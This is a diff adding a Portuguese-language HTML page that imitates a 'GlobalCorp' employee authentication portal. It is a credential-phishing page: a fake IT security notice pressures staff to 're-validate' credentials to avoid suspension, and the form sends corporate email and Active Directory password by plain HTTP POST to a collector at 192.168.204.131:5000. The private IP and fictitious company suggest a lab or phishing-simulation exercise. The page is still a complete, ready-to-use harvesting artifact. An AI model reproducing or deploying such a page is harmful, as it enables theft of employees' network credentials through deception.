@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GlobalCorp - Portal do Colaborador (Autenticação)</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #1a365d;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: #718096;
+            font-size: 14px;
+        }
+
+        .notice-box {
+            background-color: #ebf8ff;
+            border-left: 4px solid #3182ce;
+            color: #2b6cb0;
+            padding: 12px;
+            font-size: 13px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #4a5568;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #cbd5e0;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus {
+            border-color: #3182ce;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #3182ce;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #2b6cb0;
+        }
+
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            font-size: 11px;
+            color: #a0aec0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="header">
+            <h1>GlobalCorp Tech</h1>
+            <p>Sistema de Autenticação Centralizado</p>
+        </div>
+
+        <div class="notice-box">
+            <strong>Aviso de Segurança TI:</strong> Como parte da migração anual de políticas de segurança corporativa, valide suas credenciais de rede abaixo para evitar a suspensão temporária dos acessos.
+        </div>
+
+        <form action="http://192.168.204.131:5000/login" method="POST">
+            <div class="form-group">
+                <label for="username">E-mail Corporativo</label>
+                <input type="email" id="username" name="email" placeholder="nome.sobrenome@globalcorp.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Senha de Rede (AD)</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required>
+            </div>
+
+            <button type="submit" class="btn-submit">Acessar Portal</button>
+        </form>
+
+        <div class="footer">
+            &copy; 2026 GlobalCorp Technology Solutions. Uso estritamente interno.
+        </div>
+    </div>
+
+</body>
+</html>
